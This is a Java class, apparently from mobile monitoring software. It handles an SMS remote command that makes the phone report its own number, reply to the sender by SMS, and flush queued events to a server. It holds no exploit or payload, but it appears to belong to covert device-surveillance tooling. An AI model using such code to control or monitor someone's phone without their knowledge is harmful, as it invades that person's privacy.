package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.protsrv.SendEventManager;
import com.vvt.reportnumber.ReportPhoneNumberListener;
import com.vvt.reportnumber.ReportPhoneNumberOnDemand;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSRequestMobileNumber extends RmtCmdSync implements ReportPhoneNumberListener {
	
	private final String TAG = "SMSRequestMobileNumber";
	private SendEventManager eventSender = Global.getSendEventManager();
	private ReportPhoneNumberOnDemand reportNumber = new ReportPhoneNumberOnDemand();
	
	public SMSRequestMobileNumber(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getRequestMobileNumberCmd());
		try {
			reportNumber.addReportPhoneNumberListener(this);
			reportNumber.reportPhoneNumber();
		} catch(Exception e) {
			Log.error(TAG + ".execute()", e.getMessage(), e);
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
			// To send events
			eventSender.sendEvents();
		}
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error(TAG + ".smsSendFailed()", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}

	// ReportPhoneNumberListener
	public void onError(String error) {
		reportNumber.removeReportPhoneNumberListener(this);
		doSMSHeader(smsCmdCode.getRequestMobileNumberCmd());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(error);
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
		Log.error(TAG + ".onError()", error);
	}

	public void onSuccess() {
		reportNumber.removeReportPhoneNumberListener(this);
		doSMSHeader(smsCmdCode.getRequestMobileNumberCmd());
		responseMessage.append(Constant.OK);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(RmtCmdTextResource.REQUEST_MOBILE_NUMBER_SUCCESS);
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}
}
